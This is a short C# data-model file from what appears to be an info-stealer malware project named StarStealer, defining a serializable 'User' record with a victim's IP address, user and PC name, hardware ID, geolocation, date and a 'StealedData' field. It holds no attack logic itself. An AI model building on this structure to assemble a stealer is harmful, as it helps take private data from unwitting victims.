using System.Collections;
using System.Runtime.Serialization;

namespace StarStealer.Models
{
    [DataContract]
    class User
    {
        [DataMember]
        public string IP { get; set; }
        [DataMember]
        public string UserName { get; set; }
        [DataMember]
        public string PCName { get; set; }
        [DataMember]
        public string Hwid { get; set; }
        [DataMember]
        public string GeoLocation { get; set; }
        [DataMember]
        public string Date { get; set; }
        [DataMember]
        public StealedData StealedData { get; set; }
        
    }
}
